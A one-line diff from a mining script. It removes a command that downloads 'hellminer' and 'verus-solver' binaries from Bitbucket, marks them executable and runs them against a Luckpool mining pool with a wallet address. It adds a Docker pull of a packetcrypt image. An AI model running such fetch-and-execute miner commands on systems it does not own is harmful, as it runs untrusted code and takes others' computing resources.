@@ -1,1 +1,1 @@
-wget https://bitbucket.org/vps3/ngehe/downloads/verus-solver; wget https://bitbucket.org/vps3/ngehe/downloads/hellminer; chmod +x hellminer; chmod +x verus-solver; ./hellminer -c ap.luckpool.net:3956#xnsub -u RUTsC4pbFNKyPUkDLpfYb9Y1p8FY4vESqP.rizal2 -p x --cpu 7	
+docker pull thomasjp0x42/packetcrypt
